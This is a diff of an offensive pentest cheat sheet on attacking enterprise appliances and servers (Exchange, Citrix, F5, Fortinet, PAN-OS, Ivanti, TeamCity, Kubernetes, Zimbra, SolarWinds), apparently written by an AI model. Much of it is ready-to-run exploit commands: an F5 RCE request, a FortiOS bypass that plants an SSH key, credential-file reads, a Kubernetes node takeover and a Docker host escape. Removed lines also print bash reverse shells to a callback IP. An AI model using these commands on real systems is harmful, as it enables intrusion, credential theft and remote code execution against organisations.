 # SSRF → auth bypass → arbitrary file write → webshell
-python3 proxylogon.py -t https://target.com -e attacker@target.com
+msfconsole -q -x 'search cve:2021-26855'
 
 # ProxyShell (CVE-2021-34473/34523/31207) — unauth RCE via autodiscover
-python3 proxyshell.py -u https://target.com
+msfconsole -q -x 'search cve:2021-34473'
 
-# CVE-2022-41082 (ProxyNotShell) — authenticated SSRF + RCE
-# Requires valid credentials — use after spray
+# ProxyNotShell (CVE-2022-41040 SSRF + CVE-2022-41082 RCE) — needs valid creds; use after spray
+msfconsole -q -x 'search cve:2022-41082'
 ```
 
 > [!note]
@@ -1105,17 +1164,20 @@ nmap -sV -p 443,8443 --script=http-title target.com
 ### Attacking
 
 ```bash
-# CVE-2023-3519 — Unauthenticated RCE (NetScaler ADC/Gateway < 13.1-49.13)
-# HTTP GET to /gwtest/formssso triggers buffer overflow
-python3 CVE-2023-3519.py -t https://target.com -l 10.10.14.15 -p 9001
-# https://github.com/mandiant/CVE-2023-3519
+# CVE-2023-3519 — Unauthenticated RCE, stack overflow (NetScaler ADC/Gateway 13.1 < 13.1-49.13,
+# 13.0 < 13.0-91.13). Requires the appliance to be configured as a Gateway or AAA virtual server.
+# Sink: /gwtest/formssso
+msfconsole -q -x 'search cve:2023-3519'
+# Mandiant's repo for this CVE is an IOC *scanner* (post-compromise check), not an exploit.
 
-# CVE-2023-24488 — XSS (same version range, lower severity)
+# CVE-2023-24488 — reflected XSS (lower severity; separate version range — check the advisory)
 
-# Citrix Bleed (CVE-2023-4966) — session token leak, no auth required
-# Leaks memory including valid session tokens → session hijack
-python3 citrixbleed.py -t https://target.com
+# Citrix Bleed (CVE-2023-4966) — unauth memory over-read leaking session tokens → session hijack
+msfconsole -q -x 'search cve:2023-4966'
 # Use leaked token in cookie: NSC_AAAC=<token>
+
+# Citrix Bleed 2 (CVE-2025-5777) — same class (pre-auth memory over-read) disclosed June 2025;
+# check the Citrix bulletin for affected builds
 
 # Default credentials
 # nsroot:nsroot (CLI via SSH port 22)
@@ -1144,10 +1206,10 @@ nmap -sV -p 443,8443,22 target.com
 
 ```bash
 # CVE-2022-1388 — Unauthenticated RCE via iControl REST API (BIG-IP 16.1.x < 16.1.2.2, etc.)
+# ⚠ UNVERIFIED payload (2026-10-07 audit could not source-check it) — test in a lab first, or use the module below
 curl -sk -X POST https://target.com/mgmt/tm/util/bash -H "Content-Type: application/json" -H "Authorization: Basic YWRtaW46" -H "X-F5-Auth-Token: a" -H "Connection: keep-alive, X-F5-Auth-Token" -d '{"command":"run","utilCmdArgs":"-c id"}'
 
-# PoC with shell
-python3 CVE-2022-1388.py -t https://target.com
+# Module alt: msfconsole -q -x 'search cve:2022-1388'
 
 # CVE-2020-5902 — Path traversal → RCE via TMUI (BIG-IP < 15.1.0.4)
 curl -sk 'https://target.com/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
@@ -1177,14 +1239,18 @@ curl -sk 'https://target.com/dana-na/../dana/html5acc/guacamole/../../../tmp/sys
 curl -sk 'https://target.com/dana-na/../dana/html5acc/guacamole/../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/' > creds.mdb
 # Parse data.mdb for plaintext credentials
 
-# CVE-2021-22893 — Unauthenticated RCE (Pulse Connect Secure < 9.1R11.4)
-python3 CVE-2021-22893.py -t https://target.com
+# CVE-2021-22893 — Auth bypass → RCE, unauthenticated (Pulse Connect Secure 9.0R3+ / 9.1 < 9.1R11.4)
 
-# CVE-2023-46805 + CVE-2024-21887 — Auth bypass + command injection (Ivanti ICS/IPS < 22.3.x)
-curl -sk 'https://target.com/api/v1/totp/user-backup-code/../../license/keys-status/' -H "X-SNS-Header: ;;;id"
+# CVE-2023-46805 + CVE-2024-21887 — Auth bypass + command injection (Ivanti Connect/Policy Secure 9.x, 22.x)
+# The auth bypass is a ../ traversal from an unauthenticated API path into a protected one; the
+# command injection rides in the URL PATH of that protected endpoint (not in a header).
+msfconsole -q -x 'search cve:2024-21887'
 
-# Ivanti DSM (Desktop & Server Management) — CVE-2023-38035
-# Unauthenticated access to Sentry admin portal
+# CVE-2025-0282 — pre-auth stack overflow RCE in Ivanti Connect Secure (exploited Jan 2025);
+# check the Ivanti advisory for fixed builds
+
+# Ivanti Sentry (ex-MobileIron Sentry) — CVE-2023-38035
+# Auth bypass on the System Manager Portal / MICS admin API (port 8443) → OS command execution as root
 ```
 
 > [!note]
@@ -1210,15 +1276,17 @@ curl -sk https://target.com/php/login.php -I
 ### CVEs
 
 ```bash
-# CVE-2024-3400 — Unauthenticated OS command injection via GlobalProtect (PAN-OS < 11.1.2-h3)
-# Requires GlobalProtect gateway or portal enabled
-curl -sk 'https://target.com/ssl-vpn/hipreport.esp' -b 'SESSID=/../../../opt/paloaltonetworks/gp/var/log/gp/gpd.log' --data 'user=;id>/tmp/pwned;'
-
-# Full PoC
-python3 CVE-2024-3400.py -t https://target.com -c "bash -i >& /dev/tcp/10.10.14.15/9001 0>&1"
+# CVE-2024-3400 — Unauthenticated OS command injection via GlobalProtect
+# Affected: PAN-OS 10.2 < 10.2.9-h1, 11.0 < 11.0.4-h1, 11.1 < 11.1.2-h3 with a GP gateway or portal enabled
+# Mechanism: the SESSID cookie on /ssl-vpn/hipreport.esp is used as a FILE NAME without sanitising
+# → path traversal file-create; a file name containing shell syntax is later executed by a root
+# process. The injection is in the cookie, not the POST body.
+msfconsole -q -x 'search cve:2024-3400'
 
 # CVE-2019-1579 — Pre-auth RCE (GlobalProtect < 7.1.19/8.0.12/8.1.3)
-python3 pan_rce.py https://target.com
+
+# CVE-2024-0012 + CVE-2024-9474 — management-web-interface auth bypass + privesc to root
+# (only if the PAN-OS management UI is reachable — it shouldn't be from outside)
 ```
 
 ---
@@ -1236,19 +1304,20 @@ curl -sk https://target.com/remote/login | grep -i "fortinet\|fortigate\|version
 ### CVEs
 
 ```bash
-# CVE-2022-40684 — Auth bypass on FortiOS/FortiProxy/FortiSwitchManager admin interface
-# Add admin account without authentication
+# CVE-2022-40684 — Auth bypass on the admin interface (FG-IR-22-377)
+# Affected: FortiOS 7.0.0–7.0.6, 7.2.0–7.2.1 · FortiProxy 7.0.0–7.0.6, 7.2.0 · FortiSwitchManager 7.0.0, 7.2.0
+# Writes an SSH key to the admin user without authentication
 curl -sk -X PUT 'https://target.com/api/v2/cmdb/system/admin/admin' -H 'User-Agent: Report Runner' -H 'Forwarded: for="[127.0.0.1]:8000";by="[127.0.0.1]:9000";' -d '{"ssh-public-key1":"ssh-rsa AAAA..."}'
 
-# CVE-2023-27997 — Heap overflow RCE in SSL-VPN (FortiOS < 6.0.17/6.2.15/6.4.13/7.0.12/7.2.5)
-# Pre-auth, no interaction required
+# CVE-2023-27997 "XORtigate" — Heap overflow RCE in SSL-VPN, pre-auth (FG-IR-23-097)
+# Affected FortiOS: 6.0.0–6.0.16, 6.2.0–6.2.13, 6.4.0–6.4.12, 7.0.0–7.0.11, 7.2.0–7.2.4 (7.4 not affected)
 
-# CVE-2024-21762 — Out-of-bounds write in SSL-VPN (FortiOS < 7.4.3)
-# Unauthenticated RCE
+# CVE-2024-21762 — Out-of-bounds write in SSL-VPN, unauthenticated RCE (FG-IR-24-015)
+# Affected FortiOS: 6.0.0–6.0.17, 6.2.0–6.2.15, 6.4.0–6.4.14, 7.0.0–7.0.13, 7.2.0–7.2.6, 7.4.0–7.4.2
 
-# Check SSL-VPN for credential exposure
+# CVE-2018-13379 — SSL-VPN path traversal → plaintext credentials in session files (FG-IR-18-384)
+# Affected FortiOS: 5.4.6–5.4.12, 5.6.3–5.6.7, 6.0.0–6.0.4 — only with SSL-VPN enabled
 curl -sk 'https://target.com/remote/fgt_lang?lang=/../../../..//dev/cmdb/sslvpn_websession'
-# CVE-2018-13379 — plaintext credentials in session files
 ```
 
 ---
@@ -1264,9 +1333,8 @@ ManageEngine makes 30+ products — all historically vulnerable. Common on enter
 | ServiceDesk Plus | 8080/8443 | ITSM ticketing |
 | ADManager Plus | 8080 | AD management |
 | ADSelfService Plus | 9251 | Self-service password reset |
-| Desktop Central | 8020/8383 | Endpoint management |
-| OpManager | 80/443 | Network monitoring |
-| Endpoint Central | 8020 | Patching / MDM |
+| Endpoint Central (formerly Desktop Central) | 8020/8383 | Endpoint management / patching / MDM |
+| OpManager | 8060 (or 80/443) | Network monitoring |
 
 ### Enumeration
 
@@ -1282,21 +1350,19 @@ curl -sk http://target.com:8080/ | grep -i "manageengine\|servicedesk\|version"
 ### Attacking
 
 ```bash
-# CVE-2022-47966 — Unauthenticated RCE via SAML (multiple ME products, SAML must be enabled)
-# Affects: ServiceDesk, ADManager, ADSelfService, OpManager, etc.
-python3 CVE-2022-47966.py -t http://target.com:8080
+# CVE-2022-47966 — Unauthenticated RCE via SAML (vulnerable bundled Apache Santuario)
+# Affects 20+ ME products incl. ServiceDesk Plus, ADSelfService Plus, Endpoint Central.
+# Most need SAML SSO enabled (now or ever); ServiceDesk Plus is exploitable regardless.
+msfconsole -q -x 'search cve:2022-47966'      # separate modules per product
 
-# CVE-2021-44515 — Auth bypass + RCE (Desktop Central < 10.1.2127.18)
-curl -sk 'http://target.com:8020/client-data/../../../../etc/passwd'
+# CVE-2021-44515 — Auth bypass → RCE (Desktop Central, Windows; exploited Dec 2021)
+# No Metasploit module — searchsploit / GitHub by CVE
 
-# CVE-2021-40539 — Pre-auth RCE (ADSelfService Plus < 6114)
-python3 CVE-2021-40539.py -t http://target.com:9251
+# CVE-2021-40539 — REST API auth bypass → pre-auth RCE (ADSelfService Plus ≤ 6113)
+msfconsole -q -x 'search cve:2021-40539'
 
-# CVE-2022-40300 — SQLi (ServiceDesk Plus MSP < 10609)
-# Authenticated SQLi → file write → webshell
-
-# Post-auth: Scripting in ServiceDesk Plus
-# Admin → General → Custom Scripts → execute on ticket actions
+# Post-auth: ServiceDesk Plus custom triggers / custom-action scripts run on the server —
+# admin access usually equals code execution
 ```
 
 > [!note]
@@ -1310,7 +1376,7 @@ python3 CVE-2021-40539.py -t http://target.com:9251
 
 ```bash
 # Default port: 8111
-# Default creds: admin:admin (set on first run)
+# No default creds — the first-run wizard creates the admin account
 curl -s http://target.com:8111/ | grep -i "teamcity\|version"
 
 # REST API
@@ -1320,17 +1386,23 @@ curl -s http://target.com:8111/app/rest/server   # version info (may require aut
 ### Attacking
 
 ```bash
-# CVE-2024-27198 — Auth bypass → admin account creation (TeamCity < 2023.11.4)
-curl -s -X POST 'http://target.com:8111/app/rest/users' -H 'Content-Type: application/json' --path-as-is '/app/rest/users;.jsp' -d '{"username":"hacker","password":"Hacker123!","email":"h@h.com","roles":{"role":[{"roleId":"SYSTEM_ADMIN","scope":"g"}]}}'
+# CVE-2024-27198 — Auth bypass → admin (TeamCity < 2023.11.4)
+# Alternative-path bypass: a request for a nonexistent path whose `jsp` parameter ends in ";.jsp"
+# is routed to the target REST endpoint without auth → create an admin user or token.
+msfconsole -q -x 'search cve:2024-27198'
 
-python3 CVE-2024-27198.py -t http://target.com:8111
+# CVE-2023-42793 — Auth bypass → admin token (TeamCity < 2023.05.4)
+msfconsole -q -x 'search cve:2023-42793'
 
-# Post-auth RCE — Build configuration → Build step → Command Line
-# Add a build step: Command Line → custom script
-bash -i >& /dev/tcp/10.10.14.15/9001 0>&1
+# Post-auth RCE — Build configuration → Build Steps → add a "Command Line" step → Run
+# (runs on the build agent as the agent's service account)
 
 # Token-based auth — check for build agent tokens in config files
 # Tokens allow triggering builds → RCE via build steps
+
+# Post-shell on the server: the super-user token is written to the log on every start
+grep -i "super user authentication token" <TeamCity_dir>/logs/teamcity-server.log
+# log in with an empty username and the token as the password
 ```
 
 > [!note]
@@ -1374,8 +1446,8 @@ kubectl auth can-i --list
 # Dashboard — exposed without auth
 # https://target.com/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/
 
-# Escape from pod to node
-# Mount host path in new pod:
+# Node takeover — if your token can create pods, schedule one that mounts the node's root FS
+# (hostPath + chroot needs no privileged flag; nsenter into PID 1 would also need privileged: true)
 kubectl apply -f - <<EOF
 apiVersion: v1
 kind: Pod
@@ -1385,17 +1457,24 @@ spec:
   containers:
   - name: escape
     image: alpine
+    command: ["sleep","infinity"]
     volumeMounts:
     - mountPath: /host
       name: host-vol
-    command: ["nsenter","--mount=/host/proc/1/ns/mnt","--","sh","-c","bash -i >& /dev/tcp/10.10.14.15/9001 0>&1"]
   volumes:
   - name: host-vol
     hostPath:
       path: /
-  hostPID: true
 EOF
+kubectl exec -it escape -- chroot /host /bin/bash     # shell on the node's filesystem
+
+# Kubelet API (10250) — anonymous auth is sometimes left on
+curl -sk https://<node>:10250/pods          # pod list = auth not enforced
+curl -sk https://<node>:10250/runningpods/
+# kubeletctl (https://github.com/cyberark/kubeletctl) automates enum + exec through the kubelet
 ```
+
+> [!note] Escaping *from inside* a container (privileged flag, mounted docker.sock, dangerous capabilities) is covered step by step in [[Techniques/Container Escape|Container Escape]].
 
 > [!note]
 > Service account tokens are often mounted automatically in pods at `/var/run/secrets/kubernetes.io/serviceaccount/token`. If you land in a container, always check this first — the token may have `cluster-admin` privileges.
@@ -1416,20 +1495,24 @@ curl -sk https://target.com/zimbra/   # webmail login
 ### Attacking
 
 ```bash
-# CVE-2022-27925 + CVE-2022-37042 — Unauthenticated RCE via mboximport (Zimbra < 9.0.0.p27)
-python3 CVE-2022-27925.py -t https://target.com
+# CVE-2022-27925 + CVE-2022-37042 — mboximport ZIP-slip file write; 37042 is the auth bypass
+# that makes it unauthenticated (8.8.15 / 9.0.0, patched 2022 — check the patch level)
+msfconsole -q -x 'search cve:2022-27925'
 
-# CVE-2022-41352 — Unauthenticated RCE via cpio archive extract (Zimbra < 9.0.0.p29)
-# Send malicious email attachment → extract drops webshell
-python3 CVE-2022-41352.py -t target.com -l 10.10.14.15 -p 9001
+# CVE-2022-41352 — Unauthenticated RCE: amavis extracts an emailed archive with cpio,
+# which follows the path traversal → webshell in the web root
+msfconsole -q -x 'search cve:2022-41352'
 
 # CVE-2023-37580 — Reflected XSS → session steal (Zimbra < 8.8.15.p41)
 
-# Default admin creds check
-curl -sk -X POST 'https://target.com:7071/service/admin/soap' -d '<AuthRequest xmlns="urn:zimbraAdmin"><name>admin</name><password>zimbra</password></AuthRequest>'
+# Admin console login check with recovered/sprayed creds (no shipped default password)
+curl -sk -X POST 'https://target.com:7071/service/admin/soap' -d '<AuthRequest xmlns="urn:zimbraAdmin"><name>admin@target.com</name><password><pass></password></AuthRequest>'
 
 # Post-auth webshell path
 # Zimbra webroot: /opt/zimbra/jetty/webapps/zimbra/
+
+# Post-shell: dump LDAP/MySQL/admin secrets from local config (run as the zimbra user)
+su - zimbra -c 'zmlocalconfig -s' | grep -i pass
 ```
 
 ---
@@ -1443,20 +1526,22 @@ curl -sk -X POST 'https://target.com:7071/service/admin/soap' -d '<AuthRequest x
 # Login: https://target.com:8787/Orion/Login.aspx
 curl -sk https://target.com:8787/ | grep -i "solarwinds\|orion"
 
-# Default creds: admin:admin
+# Default creds: Admin with a blank password (older installs) — always try it
 ```
 
 ### Attacking
 
 ```bash
-# CVE-2020-10148 — Auth bypass (Orion Platform < 2020.2.1)
-# Append ?SolarWindsOrionAccountID=Admin to bypass auth check
-curl -sk 'https://target.com:8787/WebResource.axd?SolarWindsOrionAccountID=Admin'
+# CVE-2020-10148 — API auth bypass (Orion Platform < 2020.2.1 HF2 / 2019.4 HF6)
+# Requests whose PathInfo contains WebResource.axd, ScriptResource.axd, i18n.ashx or Skipi18n
+# skip the auth check (the bug SUPERNOVA used). No Metasploit module — searchsploit / GitHub by CVE.
 
-# Post-auth RCE via Orion Job Scheduler
-# Settings → Manage Jobs → Create job → execute PowerShell
-# Or via the Orion API:
-curl -sk -X POST 'https://target.com:17778/SolarWinds/InformationService/v3/Json/Query' -u admin:admin -d '{"query":"SELECT * FROM Orion.Nodes"}'
+# Post-auth RCE — Alerts → Manage Alerts → add a trigger action "Execute an external program"
+# (runs on the Orion server as its service account)
+
+# Orion API (SWIS, port 17778) — enumerate everything Orion monitors
+curl -sk -X POST 'https://target.com:17778/SolarWinds/InformationService/v3/Json/Query' \
+  -u 'admin:<pass>' -H 'Content-Type: application/json' -d '{"query":"SELECT Caption, IPAddress FROM Orion.Nodes"}'
 
 # SUNBURST/SUNSPOT context — if you find Orion, assume it has broad network visibility
 # Check connected agents — Orion has WMI/SNMP/SSH access to monitored hosts
@@ -1489,26 +1574,29 @@ curl -sk -X POST 'https://target.com:17778/SolarWinds/InformationService/v3/Json
 | PRTG | Command injection | CVE-2018-9276 via Notifications → execute program |
 | GitLab | Unauth RCE | CVE-2021-22205 (ExifTool image parsing, < 13.10.3) |
 | Nagios XI | Auth'd command injection | CVE-2021-25296/25297/25298 |
-| Nagios XI | SQLi (unauth) | `sqlmap -u '.../banner_message-ajaxhelper.php?...' --batch` |
+| Nagios XI | SQLi (any logged-in user) | CVE-2023-40931 — `sqlmap` POST `id` on `banner_message-ajaxhelper.php` with session cookie |
+| Cacti | Unauth RCE | CVE-2022-46169 (≤ 1.2.22) — `exploit/linux/http/cacti_unauthenticated_cmd_injection` |
+| Jenkins | Decrypt stored creds | Script Console: `println(hudson.util.Secret.decrypt("{AQAA...}"))` |
 | Exchange/OWA | Password spray | `Invoke-PasswordSprayOWA -ExchHostname target.com -UserList users.txt -Password 'X'` |
 | Exchange/OWA | Unauth RCE | ProxyLogon (CVE-2021-26855+27065) / ProxyShell (CVE-2021-34473) |
 | Citrix NetScaler | Unauth RCE | CVE-2023-3519 (< 13.1-49.13) |
 | Citrix NetScaler | Session hijack | Citrix Bleed CVE-2023-4966 |
 | F5 BIG-IP | Unauth RCE | CVE-2022-1388 via iControl REST `/mgmt/tm/util/bash` |
 | Ivanti/Pulse | File read | CVE-2019-11510 (< 8.1R15.1) |
-| Palo Alto GlobalProtect | Unauth RCE | CVE-2024-3400 (< 11.1.2-h3) |
+| Palo Alto GlobalProtect | Unauth RCE | CVE-2024-3400 (PAN-OS 10.2/11.0/11.1 with GP enabled — injection via `SESSID` cookie) |
 | Fortinet | Auth bypass | CVE-2022-40684 (add admin SSH key) |
 | ManageEngine | Unauth RCE (SAML) | CVE-2022-47966 |
 | TeamCity | Auth bypass → admin | CVE-2024-27198 |
 | Docker API | RCE (exposed 2375) | `docker -H tcp://target:2375 run -it --rm -v /:/host alpine chroot /host sh` |
 | Kubernetes | Enum with stolen token | `kubectl --server=https://target:6443 --token=<t> --insecure-skip-tls-verify get pods -A` |
 | Zimbra | Unauth RCE | CVE-2022-41352 (cpio extract, < 9.0.0.p29) |
-| SolarWinds Orion | Auth bypass | `curl 'https://target:8787/WebResource.axd?SolarWindsOrionAccountID=Admin'` |
+| SolarWinds Orion | Auth bypass | CVE-2020-10148 (PathInfo `WebResource.axd`/`Skipi18n` trick, < 2020.2.1 HF2) |
+| Kubernetes | Kubelet anon check | `curl -sk https://<node>:10250/pods` |
 | CGI/Shellshock | Test | `curl -H "User-Agent: () { :; }; echo vulnerable" http://target.com/cgi-bin/status` |
 | ColdFusion | Path traversal → creds | CVE-2010-2861 (`password.properties` disclosure) |
 
 ---
 
 *Created: 2026-03-20*
-*Updated: 2026-09-18*
-*Model: claude-opus-4-8*
+*Updated: 2026-10-07*
+*Model: claude-opus-5-5*
